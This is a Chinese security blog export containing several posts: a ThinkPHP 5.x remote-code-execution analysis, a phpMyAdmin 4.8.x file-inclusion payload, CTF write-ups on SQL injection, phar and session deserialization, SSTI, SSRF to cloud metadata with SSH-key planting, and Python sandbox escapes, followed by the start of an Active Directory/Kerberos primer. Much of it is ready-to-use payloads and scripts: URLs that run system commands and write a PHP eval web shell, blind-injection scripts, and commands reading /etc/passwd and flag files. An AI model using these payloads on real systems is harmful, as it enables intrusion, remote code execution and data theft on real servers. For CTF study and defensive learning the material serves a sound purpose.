    <content type="text"><![CDATA[0x01 影响版本此次漏洞的成因是因为在没有开启强制路由的情况下控制器没过滤所引起的远程代码执行漏洞。 1234漏洞影响版本为：ThinkPHP 5.0.5-5.0.22ThinkPHP 5.1.0-5.1.30 漏洞分析首先看一下官方commit从补丁可以看出，漏洞产生的原因就是对于$controller没做过滤。 下面以thinkphp 5.1.29为例进行分析 先从补丁处向下追踪 $controller未作任何过滤赋值给了Moudle类的controller属性然后该属性在exec方法中被传入$this-&gt;app-&gt;controller. 继续跟踪App类下的controller方法，发现name参数进入parseMoudleAndCLass方法 继续查看，在该方法的第一个if分支，当name中含有\时，直接将name作为类名返回。根据下面路由地址定义的第四条，命令空间含有\，而且可以直接路由到类，那么只要我们能够控制controller就能访问任何类的任意方法。 此时我们再从补丁处向上分析，查看controller从哪里来的。 这里$this-&gt;dispath最终调用的时Request类的path()方法解析路由信息。这里pathinfo获取的时var_pathinfo,即我们可以GET方式传入参数index.php?s=index/\namespace\class/method,这里具体不细说，可以动态调试函数调用栈查看其具体过程。 到此为止，我们能够控制补丁处的controller，而从调用任何类的方法，此处只需要找到可以利用的类和方法即可 0x02 playload1234567891011121314151617181920211.利用system函数远程命令执行 http://localhost:9096/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami其中5.0.5版本 ?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami去掉think前面的\即可2.通过phpinfo函数写出phpinfo()的信息http://localhost:9096/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=13.写入shell:http://localhost:9096/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20^%3C?php%20@eval($_GET[%22code%22])?^%3E%3Eshell.php或者http://localhost:9096/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=../test.php&amp;vars[1][]=&lt;?php echo 'ok';?&gt;]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpmyadmin4.8.0~4.8.3任意文件包含payload]]></title>
    <url>%2Fphpmyadmin4-8-0-4-8-3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%2F</url>
    <content type="text"><![CDATA[payload:1http://127.0.0.1/phpmyadmin-4.8.1/index.php?target=db_sql.php%253f/../../../../../../phpStudy/PHPTutorial/MySQL/data/foo/bar.frm 参考链接：【首发】phpmyadmin4.8.1后台getshell 还可以包含session文件：https://yq.aliyun.com/articles/603201]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>phpmyadmin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[regexp盲注]]></title>
    <url>%2Fregexp%E7%9B%B2%E6%B3%A8%2F</url>
    <content type="text"><![CDATA[红日安全团队的发出的一道题目1234567891011121314151617181920212223242526272829&lt;?php include "./config.php";include "./flag.php";error_reporting(0);$black_list = "/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\'|";$black_list .= "=|_| |in|&lt;|&gt;|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i";if(preg_match($black_list, $_GET['user'])) exit(":P"); if(preg_match($black_list, $_GET['pwd'])) exit(":P"); $query="select user from users where user='$_GET[user]' and pwd='$_GET[pwd]'";echo "&lt;h1&gt;query : &lt;strong&gt;&lt;b&gt;&#123;$query&#125;&lt;/b&gt;&lt;/strong&gt;&lt;br&gt;&lt;/h1&gt;";$result = $conn-&gt;query($query);if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); if($row['user']) echo "&lt;h2&gt;Welcome &#123;$row['user']&#125;&lt;/h2&gt;";&#125;$result = $conn-&gt;query("select pwd from users where user='admin'");if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); $admin_pass = $row['pwd'];&#125;if(($admin_pass)&amp;&amp;($admin_pass === $_GET['pwd']))&#123; echo $flag;&#125;highlight_file(__FILE__);?&gt; 审计代码可以看到在登陆处存在注入，但是前面black_list对get的user、pwd都进行了过滤。那我们就要想办法对waf进行让绕过，首先对单引号的过滤导致无法常规闭合原来的查询语句，那么这里可以使用\转义原有语句的单引号,使其与后面的单引号闭合，然后注释掉最后的单引号即可。但是这里对注释符# -进行了过滤，可以使用;%00绕过。再就是对一些sql语句进行了过滤，但是并没有过滤 REGEXP 正则操作符。 payload1http://127.0.0.1/1.php?user=\&amp;pwd=||pwd/**/regexp/**/"^c";%00 python脚本123456789101112131415161718192021import requestsstr1 = '0123456789abcdefghijklmnopqrstuvwxyz_'url = 'http://127.0.0.1/1.php?user=\&amp;pwd=||pwd/**/regexp/**/"^&#123;0&#125;";%00'md5 = ''while 1: for i in str1: x = md5+i u = url.format(x) #print u res = requests.get(u) if 'Welcome Admin' in res.text: md5 = md5+i print md5 break if i =='_': break]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phar 实现php反序列化]]></title>
    <url>%2Fphar-%E5%AE%9E%E7%8E%B0php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%2F</url>
    <content type="text"><![CDATA[0x00 背景在Blackhat2018，安全研究员Sam Thomas分享了议题It’s a PHP unserialization vulnerability Jim, but not as we know it,利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。 0x01 原理漏洞触发点在使用phar://协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Metadata信息会被反序列化。当内核调用phar_parse_metadata()解析metadata数据时，会调用php_var_unserialize()对其进行反序列化操作，因此会造成反序列化漏洞。 0x02 漏洞利用利用条件 phar文件要能够上传到服务器端。 要有可用的魔术方法作为“跳板”。 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。 下面的函数可以利用 测试demo123456789101112//index.php&lt;?phpclass foo&#123; var $ha = 'echo "ok";'; function __destruct() &#123; eval($this-&gt;ha); &#125;&#125;$ka = $_GET['file'];file_exists($ka); 可以看到foo是一个危险函数，当危险的对象被反序列化时eval会导致命令执行。这里正好有一个file_exists的文件操作函数，为了测试方便，我们直接生成phar文件放在index.php所在目录。 1234567891011121314151617181920212223//构造phar文件的代码&lt;?php//把要进行反序列化的对象放在此处class foo&#123; var $ha = 'echo "ok";'; function __destruct() &#123; eval($this-&gt;ha); &#125;&#125; //生成对应可被利用的对象 $o = new foo(); $o-&gt;ha='echo "hello boogle";'; @unlink("phar.phar"); $phar = new Phar("phar.phar"); $phar-&gt;startBuffering(); $phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;"); //设置stub，增加gif文件头用以欺骗检测 $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest $phar-&gt;addFromString("test.txt", "test"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 这里因为调用了phar的setMetadata方法，所以需要设置php.ini中phar.readonly = Off 而使用phar文件只需要(PHP 5 &gt;= 5.3.0, PHP 7, PECL phar &gt;= 1.0.0)即可。这里生成的phar.phar可以修改为任意文件后缀，比如1.gif。然后访问index.php，使用phar://读取 0x03 CTF题123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138&lt;?php $SECRET = `../read_secret`; $SANDBOX = "../data/" . md5($SECRET. $_SERVER["REMOTE_ADDR"]); $FILEBOX = "../file/" . md5("K0rz3n". $_SERVER["REMOTE_ADDR"]); @mkdir($SANDBOX); @mkdir($FILEBOX); if (!isset($_COOKIE["session-data"])) &#123; $data = serialize(new User($SANDBOX)); $hmac = hash_hmac("md5", $data, $SECRET); setcookie("session-data", sprintf("%s-----%s", $data, $hmac)); &#125; class User &#123; public $avatar; function __construct($path) &#123; $this-&gt;avatar = $path; &#125; &#125; class K0rz3n_secret_flag &#123; protected $file_path; function __destruct()&#123; if(preg_match('/(log|etc|session|proc|read_secret|history|class)/i', $this-&gt;file_path))&#123; die("Sorry Sorry Sorry"); &#125; include_once($this-&gt;file_path); &#125; &#125; function check_session() &#123; global $SECRET; $data = $_COOKIE["session-data"]; list($data, $hmac) = explode("-----", $data, 2); if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac))&#123; die("Bye"); &#125; if ( !hash_equals(hash_hmac("md5", $data, $SECRET), $hmac) )&#123; die("Bye Bye"); &#125; $data = unserialize($data); if ( !isset($data-&gt;avatar) )&#123; die("Bye Bye Bye"); &#125; return $data-&gt;avatar; &#125; function upload($path) &#123; if(isset($_GET['url']))&#123; if(preg_match('/^(http|https).*/i', $_GET['url']))&#123; $data = file_get_contents($_GET["url"] . "/avatar.gif"); if (substr($data, 0, 6) !== "GIF89a")&#123; die("Fuck off"); &#125; file_put_contents($path . "/avatar.gif", $data); die("Upload OK"); &#125;else&#123; die("Hacker"); &#125; &#125;else&#123; die("Miss the URL~~"); &#125; &#125; function show($path) &#123; if ( !is_dir($path) || !file_exists($path . "/avatar.gif")) &#123; $path = "/var/www"; &#125; header("Content-Type: image/gif"); die(file_get_contents($path . "/avatar.gif")); &#125; function check($path)&#123; if(isset($_GET['c']))&#123; if(preg_match('/^(ftp|php|zlib|data|glob|phar|ssh2|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file)(.|\\s)*/i',$_GET['c']))&#123; die("Hacker Hacker Hacker"); &#125;else&#123; $file_path = $_GET['c']; list($width, $height, $type) = @getimagesize($file_path); die("Width is ：" . $width." px&lt;br&gt;" . "Height is ：" . $height." px&lt;br&gt;"); &#125; &#125;else&#123; list($width, $height, $type) = @getimagesize($path."/avatar.gif"); die("Width is ：" . $width." px&lt;br&gt;" . "Height is ：" . $height." px&lt;br&gt;"); &#125; &#125; function move($source_path,$dest_name)&#123; global $FILEBOX; $dest_path = $FILEBOX . "/" . $dest_name; if(preg_match('/(log|etc|session|proc|root|secret|www|history|file|\.\.|ftp|php|phar|zlib|data|glob|ssh2|rar|ogg|expect|http|https)/i',$source_path))&#123; die("Hacker Hacker Hacker"); &#125;else&#123; if(copy($source_path,$dest_path))&#123; die("Successful copy"); &#125;else&#123; die("Copy failed"); &#125; &#125; &#125; $mode = $_GET["m"]; if ($mode == "upload")&#123; upload(check_session()); &#125; else if ($mode == "show")&#123; show(check_session()); &#125; else if ($mode == "check")&#123; check(check_session()); &#125; else if($mode == "move")&#123; move($_GET['source'],$_GET['dest']); &#125; else&#123; highlight_file(__FILE__); &#125; include("./comments.html"); 参考文章：https://www.cnblogs.com/iceli/p/9564061.htmlhttps://paper.seebug.org/680/]]></content>
      <categories>
        <category>web安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[sql注入 & 服务端模板注入（SSTI）]]></title>
    <url>%2Fsql%E6%B3%A8%E5%85%A5-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88SSTI%EF%BC%89%2F</url>
    <content type="text"><![CDATA[在2018山东省省赛出现的一个ctf题目：easy flask 可以看到该页面提供了两个功能，一个是add,另一个是searcha/。而题目是easy flask,自然想到flask/jinja2的SSTI。在add处输入payload尝试一下。12username:boocomment:&#123;&#123;config&#125;&#125; 然后search一下username,发现注入成功。 但是拿出payload深入测试时，却发现对username和commemnt的内容做了长度限制。 此处先放一放，继续测试下面的search功能。发现存在sql注入。1payload1: ' union select 1,2,3 -- + 那么便可以利用sql注入，将ssti的payload显示到页面上，从而达到模板注入的效果。 最终的payload为：123-1' union select 1,2,"&#123;&#123;''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('cat /flag').read()&#125;&#125;" -- -]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[session反序列化+soap(ssrf+crlf)]]></title>
    <url>%2Fsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-soap-ssrf-crlf%2F</url>
    <content type="text"><![CDATA[出自LCTF2018一道web题：bestphp’s revenge 这道题目还是很有意思的，思路也很清奇。 首先题目给出源码index.php123456789101112&lt;?phphighlight_file(__FILE__);$b = 'implode';call_user_func($_GET[f],$_POST);session_start();if(isset($_GET[name]))&#123; $_SESSION[name] = $_GET[name];&#125;var_dump($_SESSION);$a = array(reset($_SESSION),'welcome_to_the_lctf2018');call_user_func($b,$a);?&gt; 然后还扫到一个flag.php1234567session_start();echo 'only localhost can get flag!';$flag = 'LCTF&#123;*************************&#125;';if($_SERVER["REMOTE_ADDR"]==="127.0.0.1")&#123; $_SESSION['flag'] = $flag; &#125;only localhost can get flag! 可以看到拿到flag的条件是绕过$_SERVER[“REMOTE_ADDR”]===”127.0.0.1”。这里可以利用ssrf本地去访问flag.php这里利用的思路1session反序列化-&gt;soap(ssrf+crlf)-&gt;call_user_func激活soap类 首先构造出session反序列化的条件:利用call_user_func()调用session_start()设置erialize_handler为php_serialize。因为题目源码中没有可以利用的构造pop链的类，而刚好SOAP的SoapClient类可以用来创建soap数据报文，与wsdl接口进行交互的，达到ssrf的效果。那么就可以构造soapClient的反序列化(具体参考https://www.anquanke.com/post/id/153065#h2-5[从几道CTF题看SOAP安全问题][1]、[https://xz.aliyun.com/t/2148][2])1payload = '|O:10:"SoapClient":3:&#123;s:3:"uri";s:3:"123";s:8:"location";s:25:"http://127.0.0.1/flag.php";s:13:"_soap_version";i:1;&#125;' 最后需要再利用第二个call_user_func激活soap类，具体实施是通过变量覆盖利用extract将$b为call_user_func，调用$a中对象，从而触发soap的网络请求。这里数组a中$_SESSION里的数据是soap对象，再经过reset()弹出这个对象成为了$a[0]。12$_GET = array('f'=&gt;'extract');$_POST = array('b'=&gt;'call_user_func'); 附一payload12345678910111213141516171819202122232425import requestsimport reurl = "http://172.81.210.82/"payload = '|O:10:"SoapClient":3:&#123;s:3:"uri";s:3:"123";s:8:"location";s:25:"http://127.0.0.1/flag.php";s:13:"_soap_version";i:1;&#125;'r = requests.session()data = &#123;'serialize_handler' : 'php_serialize'&#125;url1 = url+"?f=session_start&amp;name="+payloadhtml = r.post(url1, data=data).textdata = &#123;'b' : "call_user_func"&#125;url2 = url+"?f=extract&amp;name="+payloadhtml = r.post(url2, data=data).textdata = &#123;'b' : "var_dump"&#125;url2 = url+"?f=extract&amp;name="+payloadhtml = r.post(url2, data=data).textrs = re.findall(r'string\(26\) "(.*?)"', html)url2 = urlcookie = &#123;"Cookie":"PHPSESSID="+rs[0]&#125;html = r.post(url2,headers = cookie).textprint html 资料：LCTF 2018 Writeup – Nu1L]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python ssrf+put上传ssh公钥]]></title>
    <url>%2Fpython-ssrf-put%E4%B8%8A%E4%BC%A0ssh%E5%85%AC%E9%92%A5%2F</url>
    <content type="text"><![CDATA[0x00 前言来源于lctf2018的一道web题：Travel 0x01 题目源码首先题目给出源码1234567891011121314151617181920212223242526@app.route('/upload/&lt;filename&gt;', methods = ['PUT'])def upload_file(filename): name = request.cookies.get('name') pwd = request.cookies.get('pwd') if name != 'lctf' or pwd != str(uuid.getnode()): return "0" filename = urllib.unquote(filename) with open(os.path.join(app.config['UPLOAD_FOLDER'], filename), 'w') as f: f.write(request.get_data(as_text = True)) return "1" return "0"@app.route('/', methods = ['GET'])def index(): url = request.args.get('url', '') if url == '': return render_template('index.html') if "http" != url[: 4]: return "hacker" try: response = requests.get(url, timeout = 10) response.encoding = 'utf-8' return response.text except: return "Something Error" 0x02 题目分析可以看到只要name=’lctf’&amp;&amp;pwd=str(uuid.getnode())即可登陆成功上传任意文件。而这里需要知道uuid.getnode()也就是网卡地址。正常的话可以读取/sys/class/net/eth0/address来获得。题目是Python + requests库。requests库的底层是urllib，而没有任何扩展的urllib仅支持http和https协议，因此我们没有办法读取任意文件。我们查一查IP，就能发现是腾讯云的机器。既然是云服务商，那么通常就会有一个metadata的API。例如，Amazon EC2，就可以通过 http://169.254.169.254 来获取metadata，而所有基于OpenStack搭建的云服务也都使用这个地址。 因此，让我们查看腾讯云的文档，很容易就能搞出payload：1http://118.25.150.86/?url=http://metadata.tencentyun.com/latest/meta-data/mac 得到网卡地址152:54:00:48:c8:73（hex）-&gt;90520735500403(int) 然后在put的时候会出现一个问题 会出现一个405 not allowed而与POST出现的不太一样。 那么这里可以确认是Nginx层面上禁止了PUT。Flask对这个问题有解决方案，即X-HTTP-Method-Override头。 这里利用任意文件写+目录穿透上传ssh公钥。在本地生成ssh公钥123cd /root/.ssh/ssh-keygen -t rsa -P '' 然后将公钥上传到目录 1/home/lctf/.ssh/authorized_keys 这里需要注意到是需要将目录进行两次url编码1..%252f..%252f..%252f..%252f..%252f..%252fhome%252flctf%252f.ssh%252fauthorized_keys 然后即可进行登陆1ssh lctf@118.25.150.86]]></content>
      <categories>
        <category>python安全</category>
      </categories>
      <tags>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python安全tips]]></title>
    <url>%2Fpython-%E5%AE%89%E5%85%A8-tips%2F</url>
    <content type="text"><![CDATA[Input function在python2中，通过input输入的内容将作为python代码执行。 1234567$ python2 &gt;&gt;&gt; input() dir() ['__builtins__', '__doc__', '__name__', '__package__'] &gt;&gt;&gt; input() __import__('sys').exit() $ 安全的输入方式是使用raw_input()获取stdin内容，在python3中input已变得跟raw_input相等。 Assert在python中使用assert语句使用断言，例如使用断言以判断程序是否可以继续执行。1234def verify_credentials(username, password): assert username and password, 'Credentials not supplied by caller' ... authenticate possibly null user with null password ... 这样使用并没有什么问题，但是当程序使用python -O 编译为优化的字节码时，会导致asser语句被忽略。 In Python 2.7, -O has the following effect: the byte code extension changes to .pyo sys.flags.optimize gets set to 1 debug is False assert don’t get executed 可重复使用整数1234&gt;&gt;&gt; 999+1 is 1000 False&gt;&gt;&gt; 1+1 is 2 True 这两个结果看起来有点匪夷所思，但实际上是我们对is有错误的理解。is操作符是在两个对象的标识上工作的，并不能用于比较数值。在python中，万物皆对象，每个对象都有一个唯一标识，可以用id函数来读取。要找出两个变量或两个属性是否都指向同一个对象，可以使用is操作符。 浮点数比较12&gt;&gt;&gt; 2.2 * 3.0 == 3.3 * 2.0 False 上面的结果是由于固有受限精度导致舍入错误:1234&gt;&gt;&gt; (2.2 * 3.0).hex() '0x1.a666666666667p+2' &gt;&gt;&gt; (3.3 * 2.0).hex() '0x1.a666666666666p+2' float &gt; 无穷在python中，float类型支持无穷大的概念:float(‘infinity’)12&gt;&gt;&gt; 10**1000000 &gt; float('infinity') False 因此我们有理由相信，一切都比无穷小,但是一不小心，又翻车了 任意type对象比无穷大1234&gt;&gt;&gt; float &gt; float('infinity') True&gt;&gt;&gt; int &gt; float('infinity') True 这一车祸现场在python3中被处理，type()不能与float()进行比较。 私有属性python不支持对象隐藏属性，但是其提供一种使用双下划线__开头的属性隐藏方法。 123456789101112class Foo: __N=111111 N =222222 def __init__(self,name): self.__Name=name def __f1(self): print self.__Name def f2(self): self.__f1() def get_private(self): ... return self.__N 定义上面的class123456789&gt;&gt;&gt; f = Foo('boogle')&gt;&gt;&gt; f.N 222222&gt;&gt;&gt; f.__N AttributeError: Foo instance has no attribute '__N'&gt;&gt;&gt; f.__f1() AttributeError: Foo instance has no attribute '__f1'&gt;&gt;&gt; f.f2() boogle 从上面的测试来看，使用__开头貌似确实实现了隐藏，而且其也成功在 getattr()/hasattr()中隐藏12&gt;&gt;&gt; f.has_private() False 但这种隐藏只是一种语法上的变形，并没有达到真正意义上的隐藏 12&gt;&gt;&gt;print Foo.__dict__ &#123;'__module__': '__main__', '_Foo__f1': &lt;function __f1 at 0x02D8D0B0&gt;, 'f2': &lt;function f2 at 0x02D8D070&gt;, 'N': 222222, '_Foo__N': 111111, '__doc__': None, '__init__': &lt;function __init__ at 0x02D8D130&gt;&#125; 得到Foo类的所有属性跟函数。那么有没有办法直接查看这些属性的内容呢？答案是肯定的,我们可以用下划线_加类名加属性名的方法查看其内容（注意类名前是单下划线）1234&gt;&gt;&gt; f._Foo__N 111111&gt;&gt;&gt; f.__dict__ &#123;'_Foo__Name': 'boogle'&#125; 另外当对属性进行重新赋值时，这些隐藏的属性也会被显示出来 12345&gt;&gt;&gt; f.__N = 333333&gt;&gt;&gt; f.__N 333333&gt;&gt;&gt; f.has_private() True 模块注入python的模块导入为python注入了活力，其功能强大而复杂，例如通过 os ```可以导入系统命令模块，从而执行系统系统命令。1234python中模块和包可以通过定义在sys.path列表中的搜索路径找到的文件或目录名导入。搜索路径初始化是一个复杂的过程，它也依赖于Python版本，平台和本地配置。要想对其实施模块注入，就要知道其初始化的搜索路径，从来正确导入。我们可以运行下面的脚本知道其实际的搜索路径 $ cat myapp.py #!/usr/bin/python import sys import pprint pprint.pprint(sys.path) 123456```$ python -m myapp ['', '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg', '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg', ...] 从上面程序执行结果可以看到，其当前工作目录被自动插入到sys.path中。那么便可以在sys.path中出现的任意一个我们具有操作权限的目录写入我们要导入的模块，从而进行导入。两外在沙箱环境中，很有可能会删除然会我们继续查看，会发现sys下面又一个modules。我们对sys.moudles做一些改动，看看会发生什么12345&gt;&gt;&gt; sys.modules['os']=None&gt;&gt;&gt; import osTraceback (most recent call last):File "&lt;stdin&gt;", line 1, in &lt;module&gt;ImportError: No module named os 果然如我们所料,将os从 sys.modules 中删掉之后,就不能再引入了。那么当一个沙箱环境通过这种方式将可能带来危险的模块删除时，我们便可以重新导入 1234&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.modules['os']='/usr/lib/python2.7/os.py' &gt;&gt;&gt; import os&gt;&gt;&gt; 另外如果sys也被禁止导入了呢？那么可以使用execfile()执行相应的代码123456789&gt;&gt;&gt; execfile('/usr/lib/python2.7/os.py')&gt;&gt;&gt; system('cat /etc/passwd')root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologin...&gt;&gt;&gt; getcwd()'/usr/lib/python2.7' subprocess shell注入shell = True时此时如果命令参数可控，即可进行shell注入 1s=subprocess.Popen('ls;id', shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE) shell = False时subprocess.call([]) 执行的是list拼接起来的命令，如果可控参数在拼接之后使得参数变成了参数选项，则存在命令注入风险123&gt;&gt;&gt; from subprocess import call&gt;&gt;&gt;&gt;&gt;&gt; call(['/bin/ls', '/tmp']) 参考链接：A bite of PythonPython 如何隐藏属性]]></content>
      <categories>
        <category>python安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Unicode安全]]></title>
    <url>%2FUnicode%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[结合HCTF2018的一道web题：admin 题目源码 这道题比较有意思，思路偏门新奇。题目的目标是以admin身份登陆，下载源码之后，是一个python基于flask框架写的一个web程序，审计代码之后发现，在注册、登陆、修改密码时都用到了strlower这个函数将username转化为小写。而这里有一个偏门的小知识，那就是unicode安全，具体参考：Unicode安全我们这里可以利用的是：1ᴬ -&gt; A -&gt; a 也就是我们注册一个 ᴬdmin的用户，注册时经过strlower转化会变为 Admin,而再修改密码时，又会转化为 admin。从而达到最终越权的目的。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jsondecode解编码绕过sqlWAF]]></title>
    <url>%2Fjsondecode%E8%A7%A3%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87sqlWAF%2F</url>
    <content type="text"><![CDATA[hctf2018的一道web题目：kzone。打开后是一个qq空间钓鱼网站，打开js跳转到qq zone官网。禁用浏览器解析javascript： 搜一下目录之后发现www.zip,下载后得到源码。审计一波后台登陆等均为发现可以利用的点。最后决定还是从2018.php入手。 在第二行的位置引入了common.php，继续跟踪。在commen.php中又引入了其他的文件，最终定位在member.php。 而且在member.php中并不是功能函数，那么也就是说在包含进该php文件后是会直接执行的，而且直接将传入的json数据直接带进了sql查询语句。本来到这剧情应该时一切顺利。直接开撸就可以了，但是在构造sleep盲注之后却发现没有任何反应。无奈之下又去审计前面的代码。发现在safe.php中对传入的get,post,cookie进行了waf过滤。safe.php在member.php之前被加载，所以也被先执行。而且member.php第一行对IN_CRONLITE进行了判断，即不能直接访问member.php，只能从上层引入。而且这个waf可以说拦截的非常严格了，盲注用到的sleep，benchmark均被过滤。然后到这就歇菜了。 最终还是看了大佬写的wiriteup：HCTF2018-WEB-详细Write up 里面提到了jsondecode可以解编码，那么我们对关键字继续宁unicode编码之后传入，这样就直接绕过waf了。具体jsondecode解编码见前辈的文章：浅谈json参数解析对waf绕过的影响 附文中脚本: 12345678910111213141516171819202122232425262728293031# -*- coding: utf-8 -*-import requestsimport stringurl = 'http://kzone.2018.hctf.io/include/common.php'str1 = string.ascii_letters+string.digits+'&#123;&#125;!@#$*&amp;_,'def check(payload): cookie=&#123; 'PHPSESSID':'8ehnp28ccr4ueh3gnfc3uqtau1', 'islogin':'1', 'login_data':payload &#125; try: requests.get(url,cookies=cookie,timeout=3) return 0 except: return 1result=''for i in range(1,33): for j in str1: #payload='&#123;"admin_user":"admin\'and/**/\\u0069f(\\u0073ubstr((select/**/table_name/**/from/**/inf\\u006Frmation_schema.tables/**/where/**/table_schema\\u003Ddatabase()/**/limit/**/0,1),%d,1)\\u003D\'%s\',\\u0073leep(3),0)/**/and/**/\'1","admin_pass":65&#125;'%(i,j) payload = '&#123;"admin_user":"admin\'/**/and/**/\\u0069f(\\u0061scii(\\u0073ubstr((select/**/F1a9/**/from/**/F1444g),%s,1))\\u003d%s,\\u0073leep(4),1)/**/and/**/\'1","admin_pass":"123"&#125;'% (str(i),ord(j)) #print('[+]'+payload) if check(payload): result += j break print result 两外也有大佬编写了tamper，直接掏出了sqlmap也是非常的方便:用sqlmap解题2018HCTF-Kzone]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[域渗透基础]]></title>
    <url>%2F%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[0x01 基础知识1.域和工作组的区别域和工作组是局域网上两种不同的网络资源管理模式，它们之间的主要区别是对网络中的计算机和其他资源的管理方式不同。 工作组 概述：工作组是最常用最简单最普遍的资源管理模式。为什么说他简单是因为默认情况下windows计算机都是采用工作组方式进行资源管理的。默认情况下所有计算机都处在名为workgroup的工作组中。 优点：将不同的电脑一般按功能分别列入不同的组中，如软件部的电脑都列入“软件部”工作组中，网络部的电脑都列入“网络部”工作组中。你要访问某个部门的资源，就在“网上邻居”里找到那个部门的工作组名，双击就可以看到那个部门的电脑了。计算机通过工作组进行分类，使得我们访问资源更加具有层次化。 问题：没有办法统一管理（比如统一安装软件）；没办法集中身份验证（工作组中的计算机相互独立，相互访问时需要输入密码的） 特点：工作组资源管理模式适合于网络中计算机不多，对管理要求不严格的情况。他的建立步骤简单，使用起来也很好上手。大部分中小公司都采取工作组的方式对资源进行权限分配和目录共享。 域 概述：与工作组的平等性有所不同，“域”是一个相对严格的管理模式，解决了工作组无法统一管理、没办法集中身份验证的问题。“域”指的是服务器控制网络上的计算机能否加入。实行严格的管理对网络安全是非常必要的。 概念解释：活动目录（Active Directory），AD：活动目录是WindowsServer在网络环境中提供的“资源目录”。活动目录是储存着域中相关资源信息的目录，例如计算机，用户组，数据库，服务器，打印机，用户属性（权限等），就像一个数据库。域控（Domain Controller），DC：安装了AD的服务器就是域控制器，即有AD的计算机就是DC。 2.DNS定位域控制器DNS负责将域名解析成IP地址 内网的DNS则可以定位DC，域会有名称，比如domaintest。域会向DNS注册这个名称，即SRV记录。域中的计算机访问SRV来进而访问DC。 通常DNS和DC会安装在同一计算机上，因而此计算的本地连接DNS要指向自身。 3.AD(活动目录）的安装Windows2008R2中创建域控制器参考文章Windows2008如何配置域控制器(活动目录)主要命令dcpromo然后根据需要下一步即可。 搭建完AD之后，主域控会生成一个krbtgt账号，他是Windows活动目录中使用的客户/服务器认证协议，为通信双方提供双向身份认证 4.域成员主机加入域成员的加入，需要注意的是： 配置成员主机与控制在同一ip段 配置成员主机dns为域控ip（域控主机被设置为DNS服务器） 在我的电脑-属性-电脑名称中修改domain即可，输入域控主机名字然后弹出窗口输入账号密码即可。 那么在加入域之后有什么变化呢？ 其中比较明显的就是在登陆的时候，可以发现xp传统的登陆界面没有了。而出现了一个登陆界面，在这个界面中可可以选择以域内其他用户的身份登陆主机。 添加域用户 思考? 域管理员、域用户、域成员主机？区别 0x02 kerberos简单介绍kerberos一词原意为希腊神话中守护地狱之门的一条三头神犬。麻省理工学院在雅典娜计划中以此为名，提出了并实现了用于计算机网络的身份认证协议。以kerberos为名，显示了该协议具有相当的安全性。 功能 一个安全认证协议 用tickets验证 避免本地保存密码和在互联网上传输密码 包含一个可信任的第三方 使用对称加密 客户端与服务器之间能够相互验证 以上的特点表明，Kerberos只提供一种功能——在网络上安全的完成用户的身份验证 认证过程kerberos协议的认证过程可以两个部分： 证明自己 请求他人 在说明kerberos的认证过程之前，先简单介绍几个基本的名词。 KDC 